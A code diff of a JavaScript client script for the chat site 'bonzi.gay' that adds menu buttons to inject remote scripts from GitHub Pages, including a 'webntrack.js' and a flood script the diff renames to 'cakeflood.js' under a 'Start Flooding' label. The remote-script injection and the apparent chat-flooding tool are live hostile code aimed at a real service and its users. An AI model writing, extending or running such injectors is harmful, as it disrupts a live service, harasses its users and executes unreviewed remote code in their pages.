@@ -567,9 +567,8 @@ if (location.hostname === "bonzi.gay") {
   var menuContent = `
     <div id='bg'><a href='#'>Background Options</a></div><br>
     <div id='menuoptions'><a href='#'>Menu Options</a></div><br>
-    <div id='inject1'><a href='#'>Inject webntrack.js</a></div><br>
-    <div id='inject2'><a href='#'>Inject flood.js</a></div>
-    <div id='klok'><a href='#'>Inject flood.js</a></div>
+    <div id='inject1'><a href='#'>Fucking inject 'webntrack.js'</a></div><br>
+    <div id='inject2'><a href='#'>Start Flooding</a></div>
 
   `;
 try {
@@ -654,20 +653,9 @@ ${chatloghtml.innerHTML}
 
   var inject1 = menuContainer.querySelector('#inject1 a');
   var inject2 = menuContainer.querySelector('#inject2 a');
-  var klok = menuContainer.querySelector('#klok a');
+  var klok = "dih";
 
   inject1.addEventListener('click', function(e) {
-    e.preventDefault();
-    if (inject1.getAttribute('data-injected') === 'true') return;
-    var s1 = document.createElement('script');
-    s1.src = 'https://cmd-hue.github.io/webntrack.js';
-    s1.async = true;
-    document.body.appendChild(s1);
-    inject1.textContent = 'webntrack.js Injected';
-    inject1.style.color = 'lime';
-    inject1.setAttribute('data-injected', 'true');
-  });
-    klok.addEventListener('click', function(e) {
     e.preventDefault();
     if (inject1.getAttribute('data-injected') === 'true') return;
     var s1 = document.createElement('script');
@@ -682,7 +670,7 @@ ${chatloghtml.innerHTML}
     e.preventDefault();
     if (inject2.getAttribute('data-injected') === 'true') return;
     var s2 = document.createElement('script');
-    s2.src = 'https://gamate-hash.github.io/flood.js';
+    s2.src = 'https://gamate-hash.github.io/cakeflood.js';
     s2.async = true;
     document.body.appendChild(s2);
     inject2.textContent = 'flood.js Injected';
